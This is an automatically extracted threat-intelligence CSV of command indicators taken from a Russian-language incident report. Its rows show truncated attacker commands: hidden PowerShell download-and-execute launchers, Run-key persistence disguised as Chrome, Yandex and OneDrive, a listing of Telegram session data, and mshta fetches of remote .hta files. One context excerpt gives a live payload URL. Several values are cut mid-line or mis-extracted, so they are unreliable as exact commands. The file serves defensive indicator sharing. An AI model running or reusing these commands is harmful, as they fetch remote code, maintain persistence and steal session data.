schema_version,actor_ref,artifact_id,observation_id,artifact_type,value,normalized_value,disposition,observed_at,observed_at_precision,observed_at_status,observed_at_basis,source_published_at,source_id,source_path,source_location,campaign_refs,malware_refs,infrastructure_refs,roles,campaign_count,seen_in_multiple_campaigns,confidence,tlp,extraction_method,context_excerpt,analyst_notes
1.0.0,actor--anonymous,artifact--sha256:57004f3c19b229158bf673d0cd2dffa5cf255b151c8d56f03221f0fb24bf6bbd,observation--sha256:397a7a042a37d3b8c559fe7225bf634049f4b9924416a28da0eafbece3bb768b,command,"$ProgressPreference=""SilentlyContinue"";powershell.exe -nop -w hidden -c ""IEX","$ProgressPreference=""SilentlyContinue"";powershell.exe -nop -w hidden -c ""IEX",candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 51}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Расследование связей между группировками и эволюция угрозы Служба выполнила команду: Команда закодирована алгоритмом base64. Раскодированная команда, скрывающая индикацию процесса выполнения: Атакующие выполнили команду, используя утилиту SMBExec. Утилита создала системную службу с именем dyxbNAWr, которая выполнила команду: Команда закодирована алгоритмом base64. Данная команда выполняет дополнительную полезную нагрузку, которая загружается с ресурса http[:]//195.2.84.225:80/a. Раскодированная ",
1.0.0,actor--anonymous,artifact--sha256:7f62036852bb2e6c28a7c9b039aff545680b309e1e7c8d4dc63ec0af11199f11,observation--sha256:4b11359abe1d954b371bf86a519eb17694e4a57e962383bf661d375d76ec54ef,command,"$system32\cmd.exe /C ""reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\","$system32\cmd.exe /C ""reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\",candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 163}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"$system32\cmd.exe /C ""reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\ CurrentVersion\Run"" /v chromeproxy /t REG_SZ /d ""$temp\chrome_proxy.exe"" /F"" $system32\cmd.exe /C ""reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\ CurrentVersion\Run"" /v YandexProxySrv /t REG_SZ /d ""$temp\yandex_proxy.scr"" /F"" $system32\cmd.exe /C ""reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\ CurrentVersion\Run"" /v OneDriveSvc /t REG_SZ /d ""$appdata\Microsoft\ OneDrive\OneDriveSvc.exe"" /F"" T1547.001 Reg",
1.0.0,actor--anonymous,artifact--sha256:e7b1154adc628c35cbee11ddfbe525a527367c9f68a22f7bb8f85d37b8411125,observation--sha256:7793e14787f21e62fc4f461e2f7cd144b0a14553eb419e22465d079ec1e3e55d,command,"$system32\cmd.exe"",""cmd.exe /Q /c powershell -Command ""(Get-ChildItem","$system32\cmd.exe"",""cmd.exe /Q /c powershell -Command ""(Get-ChildItem",candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 252}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Discovery T1083 File and Directory Discovery Атакующие выполняли PowerShell-команду для проверки наличия и оценки объема данных, хранящихся в директории tdata мессенджера Telegram. Этот каталог содержит критически важные данные пользователя, включая сессионные ключи.T1057 Process Discovery Г руппировка пользовалась tasklist для получения списка процессов на локальной машине: ""$system32\cmd.exe"",""cmd.exe /Q /c powershell -Command ""(Get-ChildItem '$appdata\Telegram Desktop\tdata' -Recurse | Measur",
1.0.0,actor--anonymous,artifact--sha256:bedac9feca900fe07f2bfcbeeafb5b7ef4ded0bf8971d8902d9045539b84d49c,observation--sha256:6af3407af391b36447dffd31b5433b562cd13cbafb67c3e2934f0e2d7529696e,command,"$system32\cmd.exe"",""cmd.exe /Q /c powershell -Command ""Invoke-WebRequest","$system32\cmd.exe"",""cmd.exe /Q /c powershell -Command ""Invoke-WebRequest",candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 255}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Command and Control Lateral Movement Impact T1105 Ingress Tool Transfer Г руппировка загружала вредоносный файл с C2-сервера, маскируя его под легитимный системный компонент и размещала его в директории System32, чтобы затруднить обнаружение и повысить доверие к файлу. T1021.001 Remote Desktop Protocol && T1021.004 SSH Для бокового перемещения в рамках Windows- и Linux-инфраструктуры злоумышленники подключались к системам по протоколу RDP и SSH соответственно. T1486 Data Encrypted for Impact В р",
1.0.0,actor--anonymous,artifact--sha256:b2554333fd82adee5c49251d2191b6a061bec693f68a80d902c039f64457bd55,observation--sha256:a0fa2e34a3d2638b69c37be93fb0453ef9784cfba111db50bb0db8b4ef2aa41b,command,"$system32\cmd.exe"",""cmd.exe /Q /c powershell.exe -noni -nop -w 1 -enc","$system32\cmd.exe"",""cmd.exe /Q /c powershell.exe -noni -nop -w 1 -enc",candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 249}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"T1070.001 Clear Windows Event Logs && T1027.010 Command Obfuscation Еще одним из способов снижения обнаружения является использование base64-обфускации для PowerShell-команд, с помощью которых атакующие очищали логи событий Windows: T1218.007 Msiexec Также атакующие были замечены за использованием msiexec.exe для установки вредоносного ПО из .msi-инсталлятора: Декодированный вариант: ""$system32\cmd.exe"",""cmd.exe /Q /c powershell.exe -noni -nop -w 1 -enc IAB3AGUAdgB0AHUAdABpAGwAIABlAGwAIAB8ACAARg",
1.0.0,actor--anonymous,artifact--sha256:0b20a31b11e76764a2b14aea45efa84e247341fe89783c941071f85230dcd236,observation--sha256:92498a5302422838a0d6f4c99c6388c1d11de65e5215f56266118e60d963087f,command,"$system32\windowspowershell\v1.0\powershell.exe"",""powershell -command","$system32\windowspowershell\v1.0\powershell.exe"",""powershell -command",candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 249}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"T1070.001 Clear Windows Event Logs && T1027.010 Command Obfuscation Еще одним из способов снижения обнаружения является использование base64-обфускации для PowerShell-команд, с помощью которых атакующие очищали логи событий Windows: T1218.007 Msiexec Также атакующие были замечены за использованием msiexec.exe для установки вредоносного ПО из .msi-инсталлятора: Декодированный вариант: ""$system32\cmd.exe"",""cmd.exe /Q /c powershell.exe -noni -nop -w 1 -enc IAB3AGUAdgB0AHUAdABpAGwAIABlAGwAIAB8ACAARg",
1.0.0,actor--anonymous,artifact--sha256:2939ccc91d1175270587c2eeee5d436aea5b725c1f486fb1b1ae6c7fea597f33,observation--sha256:9dfc97f78ec967f16492efba601c115fde2cea8d0d2bf803b459ba8d9c5f5c4d,command,"%AllUsersProfile%. PowerShower обеспечивает загрузку и выполнение PowerShell-скриптов,",%AllUsersProfile%. PowerShower обеспечивает загрузку и выполнение PowerShell-скриптов,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 204}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"PowerShower Следующим звеном в атаке выступает инструмент PowerShower, написанный на языке PowerShell и предназначенный для глубокого анализа локальной сети и ее ресурсов. Этот инструмент загружается в целевую систему с помощью VBShower и сохраняется в директории %AllUsersProfile%. PowerShower обеспечивает загрузку и выполнение PowerShell-скриптов, полученных от удаленного командного центра, включая использование архивов и специализированных утилит для атак на инфраструктуру Active Directory. Ср",
1.0.0,actor--anonymous,artifact--sha256:0174735588a934176deda2f9ffe2de2cd80f02d8542d84e75ddd82939dd1ab48,observation--sha256:2c609f60fa5cefd6368c167067cc51a22fce23ad579c55419d644239789627a2,command,%COMSPEC% /Q /c echo powershell.exe -NoP -NoL -sta -NonI -W Hidden -Exec,%COMSPEC% /Q /c echo powershell.exe -NoP -NoL -sta -NonI -W Hidden -Exec,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 51}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Расследование связей между группировками и эволюция угрозы Служба выполнила команду: Команда закодирована алгоритмом base64. Раскодированная команда, скрывающая индикацию процесса выполнения: Атакующие выполнили команду, используя утилиту SMBExec. Утилита создала системную службу с именем dyxbNAWr, которая выполнила команду: Команда закодирована алгоритмом base64. Данная команда выполняет дополнительную полезную нагрузку, которая загружается с ресурса http[:]//195.2.84.225:80/a. Раскодированная ",
1.0.0,actor--anonymous,artifact--sha256:ea57bf339e53ad6dea0643ad53c9ed15216d66c05d18636773007bf15a9e2f93,observation--sha256:947dc125bda645af8c3010aff7d21f003a3d8457f5fcc64317f0e6b72a990652,command,-> cmd.exe /C mshta.exe https://<domain>.com/<word>/<word>/<word>/<word>/<w,-> cmd.exe /C mshta.exe https://<domain>.com/<word>/<word>/<word>/<word>/<w,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 220}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,wmiprvse.exe -secured -Embedding -> cmd.exe /C mshta.exe https://<domain>.com/<word>/<word>/<word>/<word>/<w ord>.hta wsmprovhost.exe -> mshta.exe https://<domain>.com/<word>/<word>/<word>/<word>/<word>.hta wmiprvse.exe -secured -Embedding -> cmd.exe /Q /c powershell.exe mshta.exe https://<domain>.com/<word>/<word>/<word>/<word>/<word>.hta wmiprvse.exe -secured -Embedding -> powershell.exe /C mshta.exe https://<domain>.com/<word>/<word>/<word>/<w ord>/<word>.hta T1021.006 Windows Remote Manageme,
1.0.0,actor--anonymous,artifact--sha256:1bc424686f5950a3020c5814aa24cc110758816fb9a0b6b62d94d6dde6fad470,observation--sha256:8175dfd2f4e9f5174f61f0c1a3caf209d7187f2b60b54f37c4be3a097a29bf5e,command,-> cmd.exe /Q /c powershell.exe mshta.exe,-> cmd.exe /Q /c powershell.exe mshta.exe,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 220}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,wmiprvse.exe -secured -Embedding -> cmd.exe /C mshta.exe https://<domain>.com/<word>/<word>/<word>/<word>/<w ord>.hta wsmprovhost.exe -> mshta.exe https://<domain>.com/<word>/<word>/<word>/<word>/<word>.hta wmiprvse.exe -secured -Embedding -> cmd.exe /Q /c powershell.exe mshta.exe https://<domain>.com/<word>/<word>/<word>/<word>/<word>.hta wmiprvse.exe -secured -Embedding -> powershell.exe /C mshta.exe https://<domain>.com/<word>/<word>/<word>/<w ord>/<word>.hta T1021.006 Windows Remote Manageme,
